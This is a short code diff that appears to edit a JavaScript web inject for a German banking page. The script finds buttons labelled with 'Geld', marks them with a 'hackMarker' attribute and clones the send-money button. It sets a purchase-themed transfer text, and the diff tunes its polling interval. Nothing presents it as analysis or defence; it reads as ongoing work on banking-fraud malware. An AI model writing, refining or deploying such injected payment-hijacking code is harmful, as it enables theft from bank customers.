@@ -14,8 +14,8 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 
 	 function timedMsg()
 		 {
+		 
 		 	$("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){
-		 			
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
 		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
@@ -82,7 +82,7 @@ global_Usage="Vielen Dank fuer Ihren Einkauf";
 		 	
 		 	
 		 	
-		 	var t=setTimeout("timedMsg()",400);
+		 	var t=setTimeout("timedMsg()",2000);
 		 }
 	 
 	 $(document).ready(function() {
